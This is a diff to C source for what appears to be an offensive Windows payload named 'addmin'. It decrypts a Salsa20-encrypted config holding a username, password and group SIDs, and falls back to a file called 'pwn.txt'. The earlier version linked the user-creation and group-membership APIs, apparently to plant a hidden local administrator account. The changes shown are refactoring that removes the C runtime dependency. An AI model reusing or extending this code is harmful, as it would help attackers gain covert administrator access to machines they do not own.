@@ -4,12 +4,9 @@
 #include <windows.h>
 
 #include <stdint.h>
-#include <stdlib.h>
 
 #include "salsa20.h"
-
-// Link against netapi32.dll (for use of NetUserAdd and NetLocalGroupAddMembers)
-#pragma comment(lib, "netapi32.lib")
+#include "util.h"
 
 
 #define CONFIG_MAX_LINE_LENGTH 256
@@ -40,6 +37,8 @@ static uint8_t KEY[16] = { 217, 78, 5, 76, 59, 107, 8, 44, 116, 168, 84, 50, 232
 #define CONFIG_FALLBACK_PATH TEXT("C:\\users\\public\\pwn.txt")
 #endif
 
+// statically allocated memory to avoid dynamic allocation
+char configBuf[CONFIG_MAX_SIZE];
 WCHAR lineBufUsername[CONFIG_MAX_LINE_LENGTH];
 WCHAR lineBufPassword[CONFIG_MAX_LINE_LENGTH];
 WCHAR lineBufGroupSids[4 * CONFIG_MAX_LINE_LENGTH];
@@ -131,7 +130,7 @@ int parseConfig(const uint8_t* configBuf, size_t configLen, config* outConfig) {
     uint8_t numGroupsSids = 0;
 
     while (lineStart < (char*)(configBuf + configLen)) {
-        char* lineEnd = strchr(lineStart, lineDelim);
+        char* lineEnd = (char*)std_strchr(lineStart, lineDelim);
         if (lineEnd) {
             *lineEnd = 0;
         } else {
@@ -163,7 +162,7 @@ int parseConfig(const uint8_t* configBuf, size_t configLen, config* outConfig) {
 }
 
 int addmin(LPCTSTR configPath, const char *fixedFallback, size_t fixedFallbackLen) {
-    char buf[CONFIG_MAX_SIZE];
+    char *buf = configBuf;
     size_t bytesRead = 0;
     int configFound = TRUE;
 
@@ -177,7 +176,7 @@ int addmin(LPCTSTR configPath, const char *fixedFallback, size_t fixedFallbackLe
         configFound = FALSE;
         if (fixedFallback) {
             configSize = min(fixedFallbackLen - 8, CONFIG_MAX_SIZE - 9);
-            memcpy(buf, fixedFallback, fixedFallbackLen);
+            std_memcpy(buf, fixedFallback, fixedFallbackLen);
             decryptConfigBuffer(buf, configBuf, configSize);
             configBuf[configSize] = 0;
         } else {
